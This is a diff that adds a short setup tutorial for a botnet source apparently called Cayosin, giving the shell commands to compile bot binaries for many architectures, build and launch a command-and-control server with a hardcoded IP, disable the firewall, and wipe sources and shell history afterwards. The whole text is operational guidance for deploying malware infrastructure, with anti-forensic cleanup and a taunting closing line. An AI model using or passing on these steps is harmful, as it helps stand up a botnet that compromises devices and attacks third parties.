@@ -1,0 +1,14 @@
+Centos 6 Install Tutorial
+Load all files into root dir on host
+
+Run: yum update -y; yum install wget python gcc nano screen httpd php -y; service httpd start; ulimit -n 999999; nano /usr/include/bits/typesizes.h
+
+Scroll down to FDS and Change 1024 to 100000
+
+*CHANGE IP and BOTPORT in main.c (int hacks)
+
+(Replace HOSTIP and BINSPREFIX in this command then run it): chmod 777 *; gcc bot/*.c -o bp -pthread; rm -rf  bp; python Cayosin.py fff 167.99.191.218 nig; rm -rf bot; mv iplookup.php /var/www/html
+
+(Replace CNCPORT and BOTPORT in this command then run it): chmod 777 *; gcc -o c2 CNC.c -pthread; rm -rf CNC.c; iptables -F; service iptables stop; screen ./c2 1 4554; rm -rf c2; rm -rf Cayosin.py; history -c; rm -rf cross-compiler-armv4l cross-compiler-armv5l cross-compiler-armv6l cross-compiler-armv7l cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64
+
+Thats it. I don't know why kids act like this source is so hard to setup. Probably because they're too dumb to recognize stripped headers.
